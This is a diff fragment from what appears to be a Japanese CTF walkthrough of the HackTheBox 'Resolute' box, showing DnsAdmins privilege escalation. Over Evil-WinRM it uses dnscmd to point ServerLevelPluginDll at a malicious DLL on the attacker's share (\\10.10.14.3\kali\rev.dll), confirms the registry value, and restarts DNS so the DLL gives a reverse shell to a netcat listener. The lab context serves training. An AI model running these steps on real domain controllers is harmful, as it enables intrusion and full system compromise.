@@ -91,7 +91,25 @@ $ nc -nvlp 4444
 *Evil-WinRM* PS C:\Users\ryan> dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.3\kali\rev.dll
 or
 *Evil-WinRM* PS C:\Users\ryan> dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.3\kali\rev.dll
+```
+レジストリの値`ServerLevelPluginDll`がきちんと我々のマリシャスdllを指し示してることを確認：
 
+```
+*Evil-WinRM* PS C:\Users\ryan\Documents> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+
+
+ServerLevelPluginDll : \\10.10.14.3\kali\rev.dll
+PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\
+PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS
+PSChildName          : Parameters
+PSDrive              : HKLM
+PSProvider           : Microsoft.PowerShell.Core\Registry
+```
+
+
+#### DNSを再起動：
+
+```
 *Evil-WinRM* PS C:\Users\ryan> sc.exe stop dns
 
 *Evil-WinRM* PS C:\Users\ryan> sc.exe start dns
